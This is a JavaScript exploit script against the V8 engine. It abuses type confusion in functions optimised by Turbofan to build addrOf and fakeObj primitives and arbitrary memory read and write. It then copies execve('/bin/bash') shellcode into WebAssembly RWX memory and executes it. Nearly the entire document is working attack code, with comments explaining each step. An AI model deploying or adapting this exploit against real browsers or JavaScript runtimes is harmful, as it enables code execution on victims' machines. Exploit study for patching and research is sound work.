var __buf = new ArrayBuffer(8);
var floatBuf = new Float64Array(__buf);
var intBuf = new Uint32Array(__buf);

// write as float and return int interpretation
function floatToInt(num) {
    floatBuf[0] = num;
    return BigInt(intBuf[0]) | (BigInt(intBuf[1]) << 32n);
}

// write as int and return float interpretation
function intToFloat(num) {
    intBuf[0] = Number(num & 0xFFFFFFFFn);
    intBuf[1] = Number(num >> 32n);
    return floatBuf[0];
}

// create some complex object
tempObj = {
    __garb1: 1.1,
    prop: 2.2,
    __garb2: 3.3,
    __garb3: 4.4
};

function readProp(obj) {
    return floatToInt(obj.prop);
}

function writeProp(obj, num) {
    obj.prop = intToFloat(num);
}

// make Turbofan optimize functions to directly
// read/write to pointer offsets of 'prop' property
// instead of doing a lookup
for (let i = 0; i < 100000; ++i) {
    readProp(tempObj);
    writeProp(tempObj, 1n);
}

// create two different objects with different
// types for same property (same offset as in 
// tempObject)
floatObj = { __garb1: 1, prop: [2.2], __garb2: 3 };
objObj = { __garb1: 1, prop: [{}], __garb2: 3 };

// since 'prop' is now an array, the property now
// stores two pointers instead, one to the array's
// properties and one for its elements (the array
// is heap-allocated)
elemPtr = readProp(floatObj) >> 32n;
propPtr = readProp(floatObj) & 0xFFFFFFFFn;

// now we write these pointers to the object with
// an object array instead, so that both object arrays
// point to the same memory space, meaning that we
// now have two ways of interpreting the same memory
toStore = (elemPtr << 32n) | propPtr;
writeProp(objObj, toStore);

// write an object (its pointer) to the array and read
// the value of the pointer as a float, leaking the
// address
function addrOf(obj) {
    objObj.prop[0] = obj;
    return floatToInt(floatObj.prop[0]) & 0xFFFFFFFFn;
}

// write an address as a float, then read it as
// an object from the objObj object (V8 assumes that
// the value points to an object as its the type signature
// of the 'prop' property)
function fakeObj(addr) {
    floatObj.prop[0] = intToFloat(addr);
    return objObj.prop[0];
}

// first float points to V8's internal float-map, mapping
// all heap-allocated float objects
magicFloats = [intToFloat(0x82439f1n), intToFloat((4n << 32n) + 0x12345678n)]

function arbRead(addr) {
    // offset for object memory layout
    if (addr % 2n === 0) {
        addr += 1n;
    }

    // store adjusted address in float array
    magicFloats[1] = intToFloat((4n << 32n) + (addr - 8n));

    // create fake object from address
    let fakedObj = fakeObj(addrOf(magicFloats) + 120n);

    // read value at immediate address
    return floatToInt(fakedObj[0]);
}

function objWrite(addr, data) {
    if (addr % 2n === 0) {
        addr += 1n;
    }


    magicFloats[1] = intToFloat((4n << 32n) + (addr - 8n));
    let fakedObj = fakeObj(addrOf(magicFloats) + 120n);
    // store at immediate address
    fakedObj[0] = intToFloat(data);
}

// equal to main() { return 0; }
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
// allocate RWX memory with WASM
var wasmInstance = new WebAssembly.Instance(
    new WebAssembly.Module(wasmCode));

// store entrypoint as jump to shellcode
var jumpToShellcode = wasmInstance.exports.main;

shellcodeBuf = new ArrayBuffer(48);
// execve("/bin/bash", NULL, NULL) in little endian
shellcode = [ 
    0x622fb848, 0x732f6e69, 0x54500068,
    0x50c0315f, 0x5a543bb0, 0x050f5e54  
];

// read ptr to RWX memory from wasm instance
var rwxAddr = arbRead(addrOf(wasmInstance) + 103n);

var view = new DataView(shellcodeBuf);
objWrite(addrOf(shellcodeBuf) + 20n, rwxAddr);

for (let i = 0; i < shellcode.length; ++i) {
    view.setBigUint64(i*4, BigInt(shellcode[i]), true);
}

jumpToShellcode();